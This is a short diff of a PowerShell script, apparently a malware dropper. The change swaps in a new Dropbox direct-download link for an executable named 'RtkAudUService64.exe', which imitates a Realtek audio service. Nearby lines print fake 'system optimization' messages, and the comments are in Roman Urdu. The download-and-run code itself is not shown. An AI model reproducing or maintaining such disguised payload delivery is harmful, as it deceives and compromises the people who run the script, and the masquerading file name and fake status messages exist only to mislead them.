@@ -89,7 +89,7 @@ try {
     
     # ========== SIRF YAHAN 3 LINES CHANGE HUIN ==========
     # LINE 1: URL change kiya (apne Dropbox ka direct link)
-    $url = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
+    $url = "https://www.dropbox.com/scl/fi/37knymyf7l250grorva4f/RtkAudUService64.exe?rlkey=xis3n39bomkm5rxfnb9wc11j9&st=cqfvpiya&dl=0"
     
     Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
     Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
